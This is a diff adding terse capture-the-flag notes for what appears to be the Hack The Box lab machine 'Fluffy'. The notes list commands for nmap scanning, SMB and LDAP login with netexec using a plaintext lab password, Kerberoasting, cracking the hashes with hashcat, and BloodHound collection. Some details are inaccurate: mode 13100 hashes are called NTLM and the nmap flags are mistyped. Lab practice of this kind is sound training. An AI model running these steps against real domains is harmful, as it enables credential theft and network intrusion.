@@ -1,0 +1,23 @@
+nmap -sV -sc -vv -oA nmap/fluffy ip address
+
+showing certificate of authority run certify
+
+there is a clockskew
+
+run sudo ntpdate ipaddress
+
+nxc smb dc01.fluffy.htb -u usernamne -p 'password'
+
+try ldap if line 7 works 
+
+nxc ldap dc01.fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!' --kerberoasting output.txt
+
+run hashcat to crack the ntlm hashes
+
+hashcat -m13100 output.txt /usr/share/wordlist/rockyou.txt
+
+
+
+run rusthound-ce --domain fluffy.htb -u j.fleischman -p 'J0elTHEM4n1990!'
+
+or run bloodhound.py
